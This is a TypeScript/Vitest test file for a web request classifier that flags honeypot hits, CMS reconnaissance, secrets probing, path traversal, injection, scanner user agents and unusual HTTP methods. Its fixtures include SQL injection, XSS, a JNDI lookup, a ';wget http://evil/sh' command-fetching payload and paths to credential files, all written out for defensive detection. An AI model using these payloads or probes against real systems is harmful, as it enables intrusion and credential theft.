import { describe, it, expect } from 'vitest'
import {
  classify,
  severityRank,
  HONEYPOT_PATHS,
  type RequestFacts,
  type ThreatCategory,
} from '../src/lib/security/classify'

const req = (over: Partial<RequestFacts> = {}): RequestFacts => ({
  method: 'GET',
  path: '/',
  query: '',
  userAgent: 'Mozilla/5.0',
  ...over,
})

describe('classify · tráfico legítimo NO matchea', () => {
  const legit = [
    '/',
    '/projects',
    '/projects/slidehub',
    '/notes/mi-articulo',
    '/status',
    '/api/health',
    '/admin',
    '/admin/monitors',
    '/api/admin/clients',
    '/contact',
    '/tools',
  ]
  for (const path of legit) {
    it(`no clasifica ${path}`, () => {
      expect(classify(req({ path }))).toBeNull()
    })
  }

  it('una query normal de navegación no matchea', () => {
    expect(classify(req({ path: '/projects', query: 'sort=recent&page=2' }))).toBeNull()
  })
})

describe('classify · honeypots (crítico)', () => {
  for (const path of HONEYPOT_PATHS) {
    it(`marca honeypot ${path}`, () => {
      const c = classify(req({ path }))
      expect(c?.category).toBe('honeypot')
      expect(c?.severity).toBe('critical')
    })
  }
})

describe('classify · recon de CMS', () => {
  const cases: string[] = ['/wp-content/plugins/x', '/wordpress/', '/administrator', '/phpmyadmin/index.php', '/adminer.php']
  for (const path of cases) {
    it(`marca recon_cms ${path}`, () => {
      expect(classify(req({ path }))?.category).toBe('recon_cms')
    })
  }
})

describe('classify · búsqueda de secretos', () => {
  const cases: [string, ThreatCategory][] = [
    ['/.env', 'secrets_probing'],
    ['/.env.local', 'secrets_probing'],
    ['/.git/config', 'secrets_probing'],
    ['/.aws/credentials', 'secrets_probing'],
    ['/id_rsa', 'secrets_probing'],
    ['/backup.sql', 'secrets_probing'],
    ['/db.bak', 'secrets_probing'],
  ]
  for (const [path, cat] of cases) {
    it(`marca ${cat} ${path}`, () => {
      const c = classify(req({ path }))
      expect(c?.category).toBe(cat)
      expect(c?.severity).toBe('high')
    })
  }
})

describe('classify · path traversal (incluye codificado)', () => {
  const cases = [
    '/files/../../etc/passwd',
    '/download?file=/etc/passwd',
    '/x/%2e%2e/%2e%2e/etc/passwd', // codificado una vez
    '/a/%252e%252e/config', // doble codificado
  ]
  for (const path of cases) {
    it(`marca path_traversal ${path}`, () => {
      const [p, q] = path.split('?')
      expect(classify(req({ path: p!, query: q ?? '' }))?.category).toBe('path_traversal')
    })
  }
})

describe('classify · inyección (path y query)', () => {
  const cases = [
    { path: '/search', query: "q=' or 1=1--" },
    { path: '/items', query: 'id=1 union select password from users' },
    { path: '/x', query: 'name=<script>alert(1)</script>' },
    { path: '/api/${jndi:ldap://evil}', query: '' },
    { path: '/run', query: ';wget http://evil/sh' },
  ]
  for (const c of cases) {
    it(`marca injection ${c.path}?${c.query}`, () => {
      expect(classify(req(c))?.category).toBe('injection')
    })
  }
})

describe('classify · bots ofensivos por User-Agent', () => {
  for (const ua of ['sqlmap/1.7', 'Mozilla/5.0 nikto', 'nuclei - open-source', 'masscan/1.3']) {
    it(`marca bad_bot con UA ${ua}`, () => {
      expect(classify(req({ path: '/', userAgent: ua }))?.category).toBe('bad_bot')
    })
  }
  it('un UA de navegador normal no matchea', () => {
    expect(classify(req({ path: '/', userAgent: 'Mozilla/5.0 (Windows NT 10.0) Chrome/120' }))).toBeNull()
  })
})

describe('classify · anomalía de protocolo', () => {
  for (const method of ['TRACE', 'CONNECT', 'TRACK']) {
    it(`marca protocol_anomaly método ${method}`, () => {
      expect(classify(req({ method, path: '/' }))?.category).toBe('protocol_anomaly')
    })
  }
  it('GET/POST/PUT normales no matchean por método', () => {
    for (const method of ['GET', 'POST', 'PUT', 'DELETE'])
      expect(classify(req({ method, path: '/projects' }))).toBeNull()
  })
})

describe('classify · robustez', () => {
  it('no lanza con entradas raras', () => {
    expect(() => classify(req({ path: '%', query: '%%%' }))).not.toThrow()
    expect(() => classify({ method: '', path: '', query: undefined, userAgent: null })).not.toThrow()
  })
})

describe('severityRank', () => {
  it('ordena de menor a mayor', () => {
    expect(severityRank('low')).toBeLessThan(severityRank('medium'))
    expect(severityRank('medium')).toBeLessThan(severityRank('high'))
    expect(severityRank('high')).toBeLessThan(severityRank('critical'))
  })
})
